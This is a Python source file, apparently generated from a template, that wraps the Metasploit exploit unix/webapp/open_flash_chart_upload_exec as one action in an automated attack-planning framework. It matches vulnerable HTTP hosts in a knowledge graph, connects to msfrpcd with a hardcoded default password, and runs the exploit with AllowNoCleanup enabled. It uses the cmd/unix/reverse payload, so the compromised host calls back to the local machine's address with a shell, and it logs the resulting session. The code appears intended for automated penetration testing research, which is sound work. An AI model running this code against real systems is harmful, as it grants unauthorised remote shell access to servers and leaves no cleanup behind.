  # noqa
import re
import os
from typing import Any, Union
from pymetasploit3.msfrpc import MsfRpcClient
from netifaces import ifaddresses, AF_INET, gateways

from action_state_interface.metasploit_exploit_actions import ExploitAction
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager
from action_state_interface.action import StateChangeSequence
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult

class MsfUnixWebappExploitOpenFlashChartUploadExec(ExploitAction):
    """MsfUnixWebappExploitOpenFlashChartUploadExec"""

    def __init__(self):
        super().__init__("MsfUnixWebappExploitOpenFlashChartUploadExec")

    noise = 0.8
    impact = 0.1

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        General implementation for msf exploits
        """
        service = Entity('Service', alias='service', protocol="http")
        if "unix" and "unix" != 'multi':
            if "unix" == 'unix':
                asset = Entity('Asset', alias='asset', os_family='Linux')
            else:
                asset = Entity('Asset', alias='asset', os_family="unix".capitalize())
        else:
            asset = Entity('Asset', alias='asset')

        if "http" == 'http':
            pattern = (
                asset.with_edge(Relationship('has', direction='r'))
                .with_node(Entity('OpenPort', alias='openport'))
                .with_edge(Relationship('is_running', direction='r'))
                .with_node(service)
            )
            matches = kg.get_matching(pattern)
            filtered_matches = []

            for pattern in matches:
                matched_software = False
                matched_version = False
                if pattern.get('service').get('version'):
                    if ["Open Flash Chart"]:
                        for software_device in ["Open Flash Chart"]:
                            if re.match(software_device, pattern.get('service').get('version'), re.IGNORECASE):
                                matched_software = True
                                break
                    else:
                        matched_software = True

                    if []:
                        for version in []:
                            if re.findall(version, pattern.get('service').get('version'), re.IGNORECASE):
                                matched_version = True
                                break
                    else:
                        matched_version = True

                else:
                    matched_software = True
                    matched_version = True

                if matched_software and matched_version:
                    filtered_matches.append(pattern)

            return filtered_matches
        elif "http" == 'ftp':
            pattern = (
                asset.with_edge(Relationship('has', direction='r'))
                .with_node(Entity('OpenPort', alias='openport'))
                .with_edge(Relationship('is_running', direction='r'))
                .with_node(service)
            )
            return kg.get_matching(pattern)
        elif "http" == 'misc':
            matches = kg.get_matching(asset)
            filtered_matches = []

            filtered_sds = list(
                filter(lambda x: x.lower() in ['windows', 'linux', 'unix', 'macos', 'android', 'ios'], ["Open Flash Chart"])
            )

            for pattern in matches:
                matched_software = False
                matched_version = False
                if pattern.get('asset').get('os_family'):
                    if filtered_sds:
                        for software_device in filtered_sds:
                            if software_device == 'unix':
                                if re.match(
                                    software_device, pattern.get('asset').get('os_family'), re.IGNORECASE
                                ) or re.match('linux', pattern.get('asset').get('os_family'), re.IGNORECASE):
                                    matched_software = True
                                    break
                            elif re.match(software_device, pattern.get('asset').get('os_family'), re.IGNORECASE):
                                matched_software = True
                                break
                    else:
                        matched_software = True

                    if []:
                        for version in []:
                            if re.findall(version, pattern.get('asset').get('os_version'), re.IGNORECASE):
                                matched_version = True
                                break
                    else:
                        matched_version = True

                if matched_software and matched_version:
                    filtered_matches.append(pattern)

            return filtered_matches
        else:
            pattern = asset.with_edge(Relationship('has', direction='r')).with_node(
                Entity('OpenPort', alias='openport', number=80)
            )
            return kg.get_matching(pattern)


    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute the exploit against the target.
        """
        msf_password = os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24")
        msf_port = int(os.environ.get("MSF_PORT", 55552))
        msf = MsfRpcClient(msf_password, port=msf_port)

        exploit = msf.modules.use("exploit", "unix/webapp/open_flash_chart_upload_exec")

        host = pattern.get('asset').get('ip_address')
        if 'RHOST' in exploit.missing_required:
            exploit['RHOST'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host

        if pattern.get('openport') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('openport').get('number')

        if 'AllowNoCleanup' in exploit.options:
            # How bad is this? We seem to have to set it for lots of the exploits to run...
            exploit["AllowNoCleanup"] = True

        possible_payloads = exploit.targetpayloads()
        payload = None
        if possible_payloads:
            if 'cmd/unix/reverse' in possible_payloads:
                payload = msf.modules.use('payload', 'cmd/unix/reverse')
            else:
                payload = msf.modules.use('payload', possible_payloads[0])
            if 'LHOST' in payload.missing_required:
                # Complicated way to get the IP address of the current machine in any network configuration
                # Essentially we look up the default gateway (which is sometimes not set, in which case we fall back to the first gateway in the list)
                # and then we get the IP address of the interface that is connected to it
                payload['LHOST'] = ifaddresses(
                    gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
                ).setdefault(AF_INET)[0]['addr']

        if payload:
            output = msf.consoles.console().run_module_with_output(exploit, payload=payload)
        else:
            output = msf.consoles.console().run_module_with_output(exploit)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "unix/webapp/open_flash_chart_upload_exec"], stdout=output, session=sess_id, exit_status=0
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )


    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any
    ) -> StateChangeSequence:
        """
        Update knowledge graph with newly established session.
        """
        host = pattern.get('asset')
        executes_on = host._id

        openport = pattern.get('openport')
        service = pattern.get('service')
        if service:
            executes_on = service._id
        elif openport:
            executes_on = openport._id

        session = Entity(
            'Session',
            alias='session',
            protocol='msf',
            active=True,
            id=output.session,
            executes_on=executes_on,
        )
        changes: StateChangeSequence = [(None, "merge", session)]
        return changes


    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        if pattern.get("openport"):
            return [
                f'Execute metasploit exploit {"unix/webapp/open_flash_chart_upload_exec"} against port {pattern.get("openport").get("number")} on {pattern.get("asset").get("ip_address")}'
            ]
        else:
            return [f'Execute metasploit exploit {"unix/webapp/open_flash_chart_upload_exec"} against {pattern.get("asset").get("ip_address")}']

